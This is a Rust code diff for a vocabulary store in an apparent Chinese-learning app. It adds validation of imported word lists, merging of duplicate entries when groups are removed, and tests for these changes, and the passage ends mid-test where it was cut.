@@ -56,6 +56,10 @@ pub enum VocabError {
     Malformed(String),
     /// The document was written by a newer version of the app.
     UnsupportedVersion(u32),
+    /// A replace was refused because not one of the file's `count` entries
+    /// could be used under its `rules`, so it would have emptied the list. The
+    /// file itself was well formed.
+    NothingUsable { count: usize, rules: ImportRules },
 }
 
 impl std::fmt::Display for VocabError {
@@ -76,6 +80,25 @@ impl std::fmt::Display for VocabError {
                 "the vocabulary file was written by a newer version of the app \
                  (format {v}, this build understands {FORMAT_VERSION})"
             ),
+            Self::NothingUsable { count, rules } => {
+                let faults = match rules {
+                    ImportRules::Typed => "empty, too long or holds a control character",
+                    ImportRules::Restore => "empty or holds a control character",
+                };
+                if *count == 1 {
+                    write!(
+                        f,
+                        "the one entry in that file cannot be used — it is {faults} — so \
+                         your list was left as it was"
+                    )
+                } else {
+                    write!(
+                        f,
+                        "none of the {count} entries in that file can be used — each is \
+                         {faults} — so your list was left as it was"
+                    )
+                }
+            }
         }
     }
 }
@@ -288,9 +311,168 @@ impl Default for Document {
 pub struct ImportSummary {
     pub added: usize,
     pub skipped_duplicates: usize,
+    /// Entries left out because their text breaks the import's
+    /// [`ImportRules`]: empty, or holding a control character, and for a file
+    /// the learner chose also longer than [`VocabStore::add_entry`] accepts. The
+    /// rest of the file is still imported, the way a duplicate is skipped rather
+    /// than failing the whole import.
+    #[serde(default)]
+    pub skipped_invalid: usize,
+    /// Entries kept, but filed under no group, because the group name they
+    /// carried breaks the rules. Counted only for entries actually added.
+    #[serde(default)]
+    pub unfiled_invalid_group: usize,
+    /// Names in the file's list of groups left out because they are blank or
+    /// break the rules.
+    #[serde(default)]
+    pub skipped_invalid_groups: usize,
+    /// Entries that, once filed under no group, met another copy of the same
+    /// word there and were merged into it — practice counters added up, the way
+    /// [`VocabStore::remove_group`] merges — rather than skipped as duplicates.
+    #[serde(default)]
+    pub merged_unfiled: usize,
     pub groups_added: usize,
     /// True when the import replaced the existing list rather than merging.
     pub replaced: bool,
+}
+
+/// How strictly [`VocabStore::import_json_with`] holds a file's rows to the
+/// list's rules (issue #40).
+#[derive(Clone, Copy, Debug, PartialEq, Eq)]
+pub enum ImportRules {
+    /// A file the learner chose: every row is held to the rules typing it is, as
+    /// [`VocabStore::add_entry`] and [`VocabStore::add_group`] check them.
+    Typed,
+    /// The app's own data coming back, as a backup restore. Earlier versions,
+    /// the sync and the legacy migration never checked length, so a backup may
+    /// hold text or group names longer than typing allows, and they are kept;
+    /// only what cannot be an entry at all — empty text, or text with a control
+    /// character — is left out.
+    Restore,
+}
+
+impl ImportRules {
+    /// The entry's text, normalised, or `None` when it breaks the rules.
+    fn text(self, text: &str) -> Option<String> {
+        match self {
+            Self::Typed => validate_text(text).ok(),
+            Self::Restore => {
+                let text = text.trim();
+                (!text.is_empty() && !text.chars().any(char::is_control)).then(|| text.to_string())
+            }
+        }
+    }
+
+    /// The group, normalised (`Some(None)` is unfiled), or `None` when the
+    /// name breaks the rules.
+    fn group(self, group: Option<&str>) -> Option<Option<String>> {
+        match self {
+            Self::Typed => validate_group(group).ok(),
+            Self::Restore => match group.map(str::trim).filter(|g| !g.is_empty()) {
+                None => Some(None),
+                Some(g) if g.chars().any(char::is_control) => None,
+                Some(g) => Some(Some(g.to_string())),
+            },
+        }
+    }
+}
+
+/// An import checked against its rules and ready to join the list.
+///
+/// Everything that can refuse a file happens in [`Self::prepare`], and it reads
+/// nothing but the file, so a caller with other work riding on the import — a
+/// backup restore, which merges an attempt log as well — can find out first
+/// and change nothing at all when the list would be refused. Applying it with
+/// [`VocabStore::apply_import`] cannot fail.
+#[derive(Clone, Debug)]
+pub struct PreparedImport {
+    merge: bool,
+    groups: Vec<String>,
+    /// Each entry, normalised, with whether it was filed under no group because
+    /// its group name broke the rules.
+    entries: Vec<(Entry, bool)>,
+    summary: ImportSummary,
+}
+
+impl PreparedImport {
+    /// Read and check an exported document.
+    ///
+    /// Every row is held to `rules` (issue #40), text and group names trimmed
+    /// first and a blank group read as unfiled:
+    ///
+    /// * an entry whose **text** breaks them is skipped and counted in
+    ///   [`ImportSummary::skipped_invalid`];
+    /// * an entry whose only fault is its **group** is kept, filed under no
+    ///   group, and counted in [`ImportSummary::unfiled_invalid_group`];
+    /// * a bad name in the list of groups is dropped and counted in
+    ///   [`ImportSummary::skipped_invalid_groups`].
+    ///
+    /// The practice fields are made sane on the way in: a best score is
+    /// clamped to `0..=100` (none when it is not a number), and an `addedAt`
+    /// that is not an ISO-8601 UTC time becomes now, as a `lastPractised` that
+    /// is not one becomes none.
+    ///
+    /// The file is refused when it is not a list at all, comes from a newer
+    /// version, or would *replace* the list with nothing because every entry in
+    /// it broke the rules ([`VocabError::NothingUsable`]) — a replace that
+    /// empties the list should be what the file says, not what the rules left of
+    /// it.
+    pub fn prepare(json: &str, merge: bool, rules: ImportRules) -> Result<Self, VocabError> {
+        let incoming: Document =
+            serde_json::from_str(json).map_err(|e| VocabError::Malformed(e.to_string()))?;
+        if incoming.version > FORMAT_VERSION {
+            return Err(VocabError::UnsupportedVersion(incoming.version));
+        }
+
+        let mut summary = ImportSummary {
+            replaced: !merge,
+            ..Default::default()
+        };
+        let mut groups = Vec::new();
+        for name in incoming.groups {
+            match rules.group(Some(&name)) {
+                Some(Some(name)) => groups.push(name),
+                // Blank, or breaking the rules: no group, as `add_group` says.
+                _ => summary.skipped_invalid_groups += 1,
+            }
+        }
+        let mut entries = Vec::new();
+        for mut entry in incoming.entries {
+            let Some(text) = rules.text(&entry.text) else {
+                summary.skipped_invalid += 1;
+                continue;
+            };
+            let group = rules.group(entry.group.as_deref());
+            let refiled = group.is_none();
+            entry.text = text;
+            entry.group = group.flatten();
+            entry.pinyin = entry.pinyin.trim().to_string();
+            entry.meaning = entry.meaning.trim().to_string();
+            entry.best_score = entry
+                .best_score
+                .filter(|score| score.is_finite())
+                .map(|score| score.clamp(0.0, 100.0));
+            if crate::time::parse_iso8601(&entry.added_at).is_none() {
+                entry.added_at = now_iso8601();
+            }
+            entry.last_practised = entry
+                .last_practised
+                .filter(|when| crate::time::parse_iso8601(when).is_some());
+            entries.push((entry, refiled));
+        }
+        if !merge && entries.is_empty() && summary.skipped_invalid > 0 {
+            return Err(VocabError::NothingUsable {
+                count: summary.skipped_invalid,
+                rules,
+            });
+        }
+        Ok(Self {
+            merge,
+            groups,
+            entries,
+            summary,
+        })
+    }
 }
 
 /// Where a vocabulary list is kept.
@@ -301,7 +483,14 @@ pub struct ImportSummary {
 /// unlike the attempt log it is handed over whole.
 pub trait VocabSink: std::fmt::Debug + Send {
     fn load(&self) -> Result<Document, VocabError>;
-    fn save(&mut self, document: &Document) -> Result<(), VocabError>;
+    /// Persist `document`.
+    ///
+    /// Returns `Some(fresh)` when the backing store had moved on since this sink
+    /// last loaded or saved (a sync wrote to it in between), in which case the
+    /// sink has written only what the learner changed and `fresh` is the list as
+    /// it now stands. The store adopts it, so its next save starts from the truth
+    /// rather than from a document that no longer describes the database.
+    fn save(&mut self, document: &Document) -> Result<Option<Document>, VocabError>;
 }
 
 /// The vocabulary list, backed by a JSON file or by a [`VocabSink`].
@@ -424,7 +613,11 @@ impl VocabStore {
     /// leave a half-written list behind.
     pub fn save(&mut self) -> Result<(), VocabError> {
         if let Some(sink) = self.sink.as_mut() {
-            return sink.save(&self.document);
+            if let Some(fresh) = sink.save(&self.document)? {
+                self.document = fresh;
+                self.sort();
+            }
+            return Ok(());
         }
         if self.path.as_os_str().is_empty() {
             return Ok(()); // in-memory store
@@ -487,6 +680,11 @@ impl VocabStore {
     }
 
     /// Change an entry's pinyin, meaning or group.
+    ///
+    /// Moving an entry into a group that already holds the same text is refused
+    /// with [`VocabError::DuplicateEntry`], the rule [`Self::add_entry`] keeps
+    /// (issue #40), and nothing changes — not even the group being created. An
+    /// entry that stays where it is can always be edited.
     pub fn update_entry(
         &mut self,
         id: u64,
@@ -495,16 +693,27 @@ impl VocabStore {
         group: Option<&str>,
     ) -> Result<Entry, VocabError> {
         let group = validate_group(group)?;
+        let index = self
+            .document
+            .entries
+            .iter()
+            .position(|e| e.id == id)
+            .ok_or(VocabError::NoSuchEntry(id))?;
+        let moving = &self.document.entries[index];
+        if moving.group != group
+            && self
+                .document
+                .entries
+                .iter()
+                .any(|e| e.id != id && e.text == moving.text && e.group == group)
+        {
+            return Err(VocabError::DuplicateEntry(moving.text.clone()));
+        }
         // A rename to a non-empty group should not require creating it first.
         if let Some(name) = &group {
             self.ensure_group(name);
         }
-        let entry = self
-            .document
-            .entries
-            .iter_mut()
-            .find(|e| e.id == id)
-            .ok_or(VocabError::NoSuchEntry(id))?;
+        let entry = &mut self.document.entries[index];
         entry.pinyin = pinyin.trim().to_string();
         entry.meaning = meaning.trim().to_string();
         entry.group = group;
@@ -561,7 +770,34 @@ impl VocabStore {
     /// Remove a group.
     ///
     /// With `delete_entries` false the entries survive and become unfiled, which
-    /// is the safe default — deleting a label should not destroy work.
+    /// is the safe default — deleting a label should not destroy work. Returns
+    /// how many entries left the group, either way.
+    ///
+    /// An entry whose text is **already unfiled** is merged into that entry
+    /// rather than becoming a second copy of it (issue #40), since one word may
+    /// be in a group only once — the rule [`Self::add_entry`] keeps — and
+    /// refusing would leave a group that cannot be deleted without first deleting
+    /// work. The entry already unfiled survives, and nothing it holds is
+    /// overwritten: it takes the moved entry's pinyin and meaning only where its
+    /// own are blank, and the practice counters add up — attempts summed, the
+    /// better best score and the later practice kept. The counters add up
+    /// exactly as the sync's collapse of two copies of one word adds them
+    /// (`collapse_counters` in `hanzi-store`, issue #35). The content does not
+    /// follow that collapse, on purpose: the collapse carries the newest copy's
+    /// pinyin and meaning by last-writer-wins, while removing a group is the
+    /// learner tidying their own list, and keeps what the survivor holds.
+    ///
+    /// That collapse keeps the copy with the lowest uuid, which this crate cannot
+    /// see. Choosing by group instead is what keeps devices agreeing: which entry
+    /// is unfiled is synced state, so two devices that remove the same group pick
+    /// the same survivor and delete the same copy, and a sync then never meets two
+    /// live copies to collapse. Two copies of one word inside the removed group —
+    /// only an older list can hold them — fold together the same way, the first
+    /// unfiled becoming the survivor for the rest. One case is left to chance:
+    /// when a list already holds two unfiled copies of the word (again, only an
+    /// older one can), the survivor is the first in list order, and two such
+    /// copies with the same `added_at` and text tie there, so which one survives
+    /// may differ between devices — the collapse above then settles it.
     pub fn remove_group(&mut self, name: &str, delete_entries: bool) -> Result<usize, VocabError> {
         let index = self
             .document
@@ -579,12 +815,29 @@ impl VocabStore {
             Ok(before - self.document.entries.len())
         } else {
             let mut unfiled = 0;
-            for entry in self.document.entries.iter_mut() {
-                if entry.group.as_deref() == Some(name) {
-                    entry.group = None;
-                    unfiled += 1;
+            let mut merged = Vec::new();
+            for index in 0..self.document.entries.len() {
+                if self.document.entries[index].group.as_deref() != Some(name) {
+                    continue;
+                }
+                unfiled += 1;
+                let text = &self.document.entries[index].text;
+                let twin = self
+                    .document
+                    .entries
+                    .iter()
+                    .position(|e| e.group.is_none() && e.text == *text);
+                match twin {
+                    Some(survivor) => {
+                        let moved = self.document.entries[index].clone();
+                        merge_into(&mut self.document.entries[survivor], &moved);
+                        merged.push(moved.id);
+                    }
+                    None => self.document.entries[index].group = None,
                 }
             }
+            self.document.entries.retain(|e| !merged.contains(&e.id));
+            self.sort();
             Ok(unfiled)
         }
     }
@@ -600,7 +853,8 @@ impl VocabStore {
             .iter_mut()
             .find(|e| e.id == id)
             .ok_or(VocabError::NoSuchEntry(id))?;
-        entry.attempts += 1;
+        // Saturating: an imported count can already sit at the top.
+        entry.attempts = entry.attempts.saturating_add(1);
         entry.best_score = Some(match entry.best_score {
             Some(best) => best.max(score),
             None => score,
@@ -640,43 +894,79 @@ impl VocabStore {
         out
     }
 
+    /// Merge or replace from an exported document the learner chose, held to
+    /// [`ImportRules::Typed`]. See [`Self::import_json_with`].
+    pub fn import_json(&mut self, json: &str, merge: bool) -> Result<ImportSummary, VocabError> {
+        self.import_json_with(json, merge, ImportRules::Typed)
+    }
+
     /// Merge or replace from an exported document.
+    ///
+    /// [`PreparedImport::prepare`] then [`Self::apply_import`]; see the first
+    /// for what is checked and when a file is refused, and the second for how
+    /// it joins the list.
+    pub fn import_json_with(
+        &mut self,
+        json: &str,
+        merge: bool,
+        rules: ImportRules,
+    ) -> Result<ImportSummary, VocabError> {
+        let prepared = PreparedImport::prepare(json, merge, rules)?;
+        Ok(self.apply_import(prepared))
+    }
+
+    /// Join a checked import to the list. Nothing here can fail.
     ///
     /// Merging keeps existing entries, adds the new ones and unions the groups;
     /// an imported entry whose text already exists in the same group is skipped
-    /// rather than duplicated.
-    pub fn import_json(&mut self, json: &str, merge: bool) -> Result<ImportSummary, VocabError> {
-        let incoming: Document =
-            serde_json::from_str(json).map_err(|e| VocabError::Malformed(e.to_string()))?;
-        if incoming.version > FORMAT_VERSION {
-            return Err(VocabError::UnsupportedVersion(incoming.version));
-        }
-
-        let mut summary = ImportSummary {
-            replaced: !merge,
-            ..Default::default()
-        };
+    /// rather than duplicated — whether it was there before or arrived earlier in
+    /// the same file, in either mode. The one exception is a collision between
+    /// two entries of the same file that the import itself caused, by filing one
+    /// of them under no group because its group name broke the rules: that is
+    /// not a repeat in the file, so the two are merged instead, as
+    /// [`Self::remove_group`] merges, and counted in
+    /// [`ImportSummary::merged_unfiled`]. A collision with an entry the list
+    /// already held is a duplicate like any other, so importing a file twice
+    /// never counts its practice twice.
+    pub fn apply_import(&mut self, prepared: PreparedImport) -> ImportSummary {
+        let PreparedImport {
+            merge,
+            groups,
+            entries,
+            mut summary,
+        } = prepared;
 
         if !merge {
             self.document.entries.clear();
             self.document.groups.clear();
         }
 
-        for name in incoming.groups {
+        for name in groups {
             if !self.document.groups.contains(&name) {
                 self.document.groups.push(name);
                 summary.groups_added += 1;
             }
         }
 
-        for mut entry in incoming.entries {
-            let duplicate = self
+        // Ids of the entries this import filed under no group, and the first id
+        // it hands out, which tells its own entries from the list's.
+        let mut refiled_ids = Vec::new();
+        let first_new_id = self.document.next_id;
+        for (mut entry, refiled) in entries {
+            let twin = self
                 .document
                 .entries
                 .iter()
-                .any(|e| e.text == entry.text && e.group == entry.group);
-            if duplicate {
-                summary.skipped_duplicates += 1;
+                .position(|e| e.text == entry.text && e.group == entry.group);
+            if let Some(twin) = twin {
+                let survivor = &mut self.document.entries[twin];
+                let caused_here = refiled || refiled_ids.contains(&survivor.id);
+                if survivor.id >= first_new_id && caused_here {
+                    merge_into(survivor, &entry);
+                    summary.merged_unfiled += 1;
+                } else {
+                    summary.skipped_duplicates += 1;
+                }
                 continue;
             }
             if let Some(name) = entry.group.clone() {
@@ -686,12 +976,16 @@ impl VocabStore {
             // resurrect, an id this document has already used.
             entry.id = self.document.next_id;
             self.document.next_id += 1;
+            if refiled {
+                refiled_ids.push(entry.id);
+                summary.unfiled_invalid_group += 1;
+            }
             self.document.entries.push(entry);
             summary.added += 1;
         }
 
         self.sort();
-        Ok(summary)
+        summary
     }
 
     fn ensure_group(&mut self, name: &str) {
@@ -717,6 +1011,30 @@ impl VocabStore {
         self.document.groups.dedup();
         self.document.entries.sort_by(entry_order);
     }
+}
+
+/// Fold `moved` into `survivor`, two entries for the same word in the same place.
+///
+/// The survivor keeps everything it has; the moved entry's pinyin and meaning
+/// fill only what is blank, and the practice counters add up the way the sync
+/// adds them when it collapses duplicates — attempts summed, the better best
+/// score and the later practice kept.
+fn merge_into(survivor: &mut Entry, moved: &Entry) {
+    if survivor.pinyin.is_empty() {
+        survivor.pinyin = moved.pinyin.clone();
+    }
+    if survivor.meaning.is_empty() {
+        survivor.meaning = moved.meaning.clone();
+    }
+    survivor.attempts = survivor.attempts.saturating_add(moved.attempts);
+    survivor.best_score = match (survivor.best_score, moved.best_score) {
+        (Some(a), Some(b)) => Some(a.max(b)),
+        (a, b) => a.or(b),
+    };
+    survivor.last_practised = match (&survivor.last_practised, &moved.last_practised) {
+        (Some(a), Some(b)) => Some(a.max(b).clone()),
+        (a, b) => a.clone().or_else(|| b.clone()),
+    };
 }
 
 /// Validate and normalise entry text.
@@ -973,6 +1291,63 @@ mod tests {
         assert!(store.groups().contains(&"B".to_string()));
     }
 
+    /// Moving an entry onto a word already in the target group is refused, the
+    /// rule `add_entry` keeps, and changes nothing (issue #40).
+    #[test]
+    fn updating_refuses_to_move_an_entry_onto_its_own_duplicate() {
+        let mut store = VocabStore::in_memory();
+        let filed = store.add_entry("好", "hǎo", "good", Some("A")).unwrap().id;
+        store.add_entry("好", "hǎo", "good", Some("B")).unwrap();
+        let unfiled = store.add_entry("好", "", "", None).unwrap().id;
+        let before = store.document().clone();
+
+        for (id, target) in [(filed, Some("B")), (filed, None), (unfiled, Some("A"))] {
+            let refused = store
+                .update_entry(id, "hào", "to like", target)
+                .unwrap_err();
+            assert!(
+                matches!(refused, VocabError::DuplicateEntry(ref t) if t == "好"),
+                "{refused}"
+            );
+        }
+        assert_eq!(
+            store.document().entries,
+            before.entries,
+            "nothing was edited"
+        );
+        assert_eq!(store.groups(), before.groups);
+
+        // An entry that stays where it is can still be edited.
+        let kept = store
+            .update_entry(filed, "hào", "to like", Some("A"))
+            .unwrap();
+        assert_eq!(kept.meaning, "to like");
+    }
+
+    /// A list from before the group check can name a group the list of groups
+    /// does not hold. A move refused there must not add the name to that list.
+    #[test]
+    fn a_refused_move_into_an_unlisted_group_leaves_the_groups_alone() {
+        let path = temp_path("unlisted-group");
+        fs::write(
+            &path,
+            r#"{"version":1,"nextId":3,"groups":[],"entries":[
+                {"id":1,"text":"好","group":"Ghost","addedAt":"2026-01-01T00:00:00Z"},
+                {"id":2,"text":"好","addedAt":"2026-01-01T00:00:01Z"}]}"#,
+        )
+        .unwrap();
+        let mut store = VocabStore::open(&path).unwrap();
+        assert!(store.groups().is_empty());
+        let refused = store.update_entry(2, "", "", Some("Ghost"));
+        assert!(
+            matches!(refused, Err(VocabError::DuplicateEntry(_))),
+            "{refused:?}"
+        );
+        assert!(store.groups().is_empty(), "{:?}", store.groups());
+        assert_eq!(store.entries_in(None).len(), 1);
+        fs::remove_file(&path).ok();
+    }
+
     // ---- groups -----------------------------------------------------------
 
     #[test]
@@ -1012,6 +1387,85 @@ mod tests {
         store.add_entry("坏", "", "", Some("Doomed")).unwrap();
         assert_eq!(store.remove_group("Doomed", true).unwrap(), 1);
         assert_eq!(store.entries().len(), 1);
+    }
+
+    /// Unfiling a group's entries never leaves two unfiled copies of one word
+    /// (issue #40): an entry whose text is already unfiled is merged into it.
+    ///
+    /// The one already unfiled survives with its own fields, takes the moved
+    /// entry's pinyin and meaning only where its own are blank, and the practice
+    /// counters add up, as the sync's collapse of duplicates adds them.
+    #[test]
+    fn removing_a_group_merges_an_entry_into_its_unfiled_twin() {
+        let mut store = VocabStore::in_memory();
+        let survivor = store.add_entry("好", "", "good", None).unwrap().id;
+        let moved = store.add_entry("好", "hǎo", "fine", Some("L1")).unwrap().id;
+        let other = store.add_entry("坏", "huài", "bad", Some("L1")).unwrap().id;
+        store.record_attempt(survivor, 40.0).unwrap();
+        store.record_attempt(moved, 90.0).unwrap();
+        store.record_attempt(moved, 70.0).unwrap();
+
+        assert_eq!(store.remove_group("L1", false).unwrap(), 2);
+        assert!(store.groups().is_empty());
+        let unfiled = store.entries_in(None);
+        assert_eq!(unfiled.len(), 2, "{unfiled:?}");
+        let texts: Vec<&str> = unfiled.iter().map(|e| e.text.as_str()).collect();
+        assert_eq!(texts.iter().filter(|t| **t == "好").count(), 1);
+
+        let merged = store.entries().iter().find(|e| e.text == "好").unwrap();
+        assert_eq!(merged.id, survivor, "the entry already unfiled survives");
+        assert_eq!(merged.meaning, "good", "its own meaning is kept");
+        assert_eq!(
+            merged.pinyin, "hǎo",
+            "a blank pinyin is filled from the twin"
+        );
+        assert_eq!(merged.attempts, 3);
+        assert_eq!(merged.best_score, Some(90.0));
+        assert!(merged.last_practised.is_some());
+        assert!(store.entries().iter().all(|e| e.id != moved));
+
+        let kept = store.entries().iter().find(|e| e.id == other).unwrap();
+        assert_eq!(
+            kept.group, None,
+            "an entry with no twin is unfiled as before"
+        );
+
+        // And the result keeps the rule `add_entry` keeps.
+        assert!(matches!(
+            store.add_entry("好", "", "", None),
+            Err(VocabError::DuplicateEntry(_))
+        ));
+    }
+
+    /// Two copies of one word inside the removed group — only a list from
+    /// before the check can hold them — become one unfiled entry: the first in
+    /// list order is unfiled, and the next folds into it.
+    #[test]
+    fn removing_a_group_folds_its_own_duplicates_together() {
+        let path = temp_path("duplicates-in-group");
+        fs::write(
+            &path,
+            r#"{"version":1,"nextId":4,"groups":["L1"],"entries":[
+                {"id":1,"text":"好","meaning":"good","group":"L1",
+                 "addedAt":"2026-01-01T00:00:00Z","attempts":2,"bestScore":60},
+                {"id":2,"text":"好","pinyin":"hǎo","group":"L1",
+                 "addedAt":"2026-01-01T00:00:01Z","attempts":1,"bestScore":80},
+                {"id":3,"text":"坏","group":"L1","addedAt":"2026-01-01T00:00:02Z"}]}"#,
+        )
+        .unwrap();
+        let mut store = VocabStore::open(&path).unwrap();
+        assert_eq!(store.remove_group("L1", false).unwrap(), 3);
+        assert_eq!(store.entries().len(), 2);
+        let good = store.entries().iter().find(|e| e.text == "好").unwrap();
+        assert_eq!(good.id, 1, "the earlier copy survives");
+        assert_eq!(good.group, None);
+        assert_eq!(
+            (good.meaning.as_str(), good.pinyin.as_str()),
+            ("good", "hǎo")
+        );
+        assert_eq!(good.attempts, 3);
+        assert_eq!(good.best_score, Some(80.0));
+        fs::remove_file(&path).ok();
     }
 
     #[test]
@@ -1215,6 +1669,267 @@ mod tests {
         assert_eq!(store.entries().len(), 1);
     }
 
+    /// An import is held to the rules typing an entry is (issue #40): a row that
+    /// breaks one is skipped and counted, and the rest of the file still arrives.
+    #[test]
+    fn importing_skips_and_counts_rows_that_break_the_rules() {
+        let long = "字".repeat(MAX_TEXT_CHARS + 1);
+        let long_group = "g".repeat(MAX_GROUP_CHARS + 1);
+        let json = serde_json::json!({
+            "version": 1,
+            "nextId": 99,
+            "groups": ["L1", "", "  ", long_group, "bad\u{7}group", "  L2  "],
+            "entries": [
+                {"id": 1, "text": "好", "group": "L1", "addedAt": "2026-01-01T00:00:00Z"},
+                {"id": 2, "text": "", "addedAt": "2026-01-01T00:00:00Z"},
+                {"id": 3, "text": "   ", "addedAt": "2026-01-01T00:00:00Z"},
+                {"id": 4, "text": long, "addedAt": "2026-01-01T00:00:00Z"},
+                {"id": 5, "text": "a\u{0}b", "addedAt": "2026-01-01T00:00:00Z"},
+                {"id": 6, "text": "坏", "group": long_group, "addedAt": "2026-01-01T00:00:00Z"},
+                {"id": 7, "text": "中", "group": "bad\ngroup", "addedAt": "2026-01-01T00:00:00Z"},
+                // Blank is unfiled, not a group named "".
+                {"id": 8, "text": "  人 ", "group": "", "pinyin": " rén ",
+                 "addedAt": "2026-01-01T00:00:00Z"},
+                {"id": 9, "text": "大", "group": "  L2 ", "addedAt": "2026-01-01T00:00:00Z"},
+            ]
+        })
+        .to_string();
+
+        for merge in [false, true] {
+            let mut store = VocabStore::in_memory();
+            let summary = store.import_json(&json, merge).unwrap();
+            // 好, 人 and 大 as they were; 坏 and 中 kept, but under no group,
+            // because only their group names were at fault.
+            assert_eq!(summary.added, 5, "{summary:?}");
+            assert_eq!(summary.skipped_invalid, 4, "{summary:?}");
+            assert_eq!(summary.unfiled_invalid_group, 2, "{summary:?}");
+            assert_eq!(summary.skipped_invalid_groups, 4, "{summary:?}");
+            assert_eq!(summary.skipped_duplicates, 0);
+            assert_eq!(store.groups(), ["L1", "L2"]);
+            let person = store.entries().iter().find(|e| e.text == "人").unwrap();
+            assert_eq!(person.group, None);
+            assert_eq!(person.pinyin, "rén");
+            assert_eq!(store.entries_in(Some("L2"))[0].text, "大");
+            for refiled in ["坏", "中"] {
+                let entry = store.entries().iter().find(|e| e.text == refiled).unwrap();
+                assert_eq!(entry.group, None, "{entry:?}");
+            }
+            for entry in store.entries() {
+                assert!(validate_text(&entry.text).is_ok(), "{entry:?}");
+                assert_eq!(
+                    validate_group(entry.group.as_deref()).unwrap(),
+                    entry.group,
+                    "{entry:?}"
+                );
+            }
+        }
+
+        // Restoring the app's own data keeps what is only too long: earlier
+        // versions, the sync and the migration never checked length.
+        let mut store = VocabStore::in_memory();
+        let summary = store
+            .import_json_with(&json, false, ImportRules::Restore)
+            .unwrap();
+        assert_eq!(summary.added, 6, "{summary:?}");
+        assert_eq!(summary.skipped_invalid, 3, "{summary:?}");
+        assert_eq!(summary.unfiled_invalid_group, 1, "{summary:?}");
+        assert_eq!(summary.skipped_invalid_groups, 3, "{summary:?}");
+        assert!(store.entries().iter().any(|e| e.text == long));
+        assert_eq!(store.entries_in(Some(&long_group))[0].text, "坏");
+        assert_eq!(store.groups(), ["L1", "L2", long_group.as_str()]);
+        assert_eq!(
+            store
+                .entries()
+                .iter()
+                .find(|e| e.text == "中")
+                .unwrap()
+                .group,
+            None
+        );
+    }
+
+    /// A replace is checked before anything is cleared: one that would leave
+    /// nothing because every entry broke the rules is refused, untouched.
+    #[test]
+    fn a_replace_that_the_rules_would_empty_is_refused() {
+        let json = r#"{"version":1,"nextId":3,"groups":["New"],"entries":[
+            {"id":1,"text":"","addedAt":"2026-01-01T00:00:00Z"},
+            {"id":2,"text":"a\u0007","group":"New","addedAt":"2026-01-01T00:00:00Z"}]}"#;
+        for rules in [ImportRules::Typed, ImportRules::Restore] {
+            let mut store = VocabStore::in_memory();
+            store.add_entry("好", "", "", Some("Old")).unwrap();
+            let before = store.document().clone();
+            let refused = store.import_json_with(json, false, rules).unwrap_err();
+            assert!(
+                matches!(refused, VocabError::NothingUsable { count: 2, .. }),
+                "{refused}"
+            );
+            assert_eq!(store.document().entries, before.entries);
+            assert_eq!(store.groups(), before.groups);
+
+            // Adding nothing is no loss, so a merge goes ahead and says so.
+            let summary = store.import_json_with(json, true, rules).unwrap();
+            assert_eq!((summary.added, summary.skipped_invalid), (0, 2));
+            assert_eq!(store.entries().len(), 1);
+        }
+
+        // The refusal says what is wrong, in the words of the rules, and in
+        // the singular for one.
+        let typed = VocabError::NothingUsable {
+            count: 2,
+            rules: ImportRules::Typed,
+        };
+        assert_eq!(
+            typed.to_string(),
+            "none of the 2 entries in that file can be used — each is empty, too long or \
+             holds a control character — so your list was left as it was"
+        );
+        let one = VocabError::NothingUsable {
+            count: 1,
+            rules: ImportRules::Restore,
+        };
+        assert_eq!(
+            one.to_string(),
+            "the one entry in that file cannot be used — it is empty or holds a control \
+             character — so your list was left as it was"
+        );
+
+        // A file that is empty on purpose still replaces the list.
+        let mut store = VocabStore::in_memory();
+        store.add_entry("好", "", "", None).unwrap();
+        store
+            .import_json(r#"{"version":1,"nextId":1}"#, false)
+            .unwrap();
+        assert!(store.entries().is_empty());
+    }
+
+    /// Two entries of one file filed under no group by the import itself,
+    /// because their group names broke the rules, are one word in one place —
+    /// not a repeat in the file — so they are merged, counters added up, as
+    /// `remove_group` merges. Landing on a word the list already held is an
+    /// ordinary duplicate, so a second import of the file counts nothing twice.
+    #[test]
+    fn entries_refiled_onto_one_another_are_merged_not_skipped() {
+        let first = "a".repeat(MAX_GROUP_CHARS + 1);
+        let second = "b".repeat(MAX_GROUP_CHARS + 1);
+        let json = serde_json::json!({
+            "version": 1,
+            "nextId": 9,
+            "entries": [
+                {"id": 1, "text": "好", "group": first, "meaning": "good",
+                 "addedAt": "2026-01-01T00:00:00Z", "attempts": 2, "bestScore": 60},
+                {"id": 2, "text": "好", "group": second, "pinyin": "hǎo",
+                 "addedAt": "2026-01-01T00:00:01Z", "attempts": 3, "bestScore": 90},
+                {"id": 3, "text": "坏", "group": first, "attempts": 1,
+                 "addedAt": "2026-01-01T00:00:02Z"},
+            ]
+        })
+        .to_string();
+
+        let mut store = VocabStore::in_memory();
+        store.add_entry("坏", "", "", None).unwrap();
+        let summary = store.import_json(&json, true).unwrap();
+        assert_eq!(summary.added, 1, "{summary:?}");
+        assert_eq!(summary.unfiled_invalid_group, 1, "{summary:?}");
+        assert_eq!(summary.merged_unfiled, 1, "{summary:?}");
+        assert_eq!(summary.skipped_duplicates, 1, "{summary:?}");
+        assert_eq!(store.entries().len(), 2);
+        let good = store.entries().iter().find(|e| e.text == "好").unwrap();
+        assert_eq!(good.group, None);
+        assert_eq!(
+            (good.meaning.as_str(), good.pinyin.as_str()),
+            ("good", "hǎo")
+        );
+        assert_eq!((good.attempts, good.best_score), (5, Some(90.0)));
+        let bad = store.entries().iter().find(|e| e.text == "坏").unwrap();
+        assert_eq!(bad.attempts, 0, "the list's own entry is left as it was");
+
+        let summary = store.import_json(&json, true).unwrap();
+        assert_eq!((summary.merged_unfiled, summary.skipped_duplicates), (0, 3));
+        let good = store.entries().iter().find(|e| e.text == "好").unwrap();
+        assert_eq!(good.attempts, 5, "a second import counts nothing twice");
+    }
+
+    /// The practice fields arrive sane: a best score inside `0..=100`, or none
+    /// when it is not a number; a time that is not one is not kept as one.
+    #[test]
+    fn imported_practice_fields_are_made_sane() {
+        let json = r#"{"version":1,"nextId":9,"entries":[
+            {"id":1,"text":"一","addedAt":"2026-01-01T00:00:00Z","bestScore":150,
+             "lastPractised":"2026-01-02T00:00:00Z"},
+            {"id":2,"text":"二","addedAt":"yesterday","bestScore":-5,"lastPractised":"never"},
+            {"id":3,"text":"三","addedAt":"2026-01-01T00:00:00Z","bestScore":1e300},
+            {"id":4,"text":"四","addedAt":"2026-01-01T00:00:00Z","attempts":4294967295}]}"#;
+        let mut store = VocabStore::in_memory();
+        store.import_json(json, false).unwrap();
+        let find = |text: &str| {
+            store
+                .entries()
+                .iter()
+                .find(|e| e.text == text)
+                .unwrap()
+                .clone()
+        };
+        assert_eq!(find("一").best_score, Some(100.0));
+        assert_eq!(
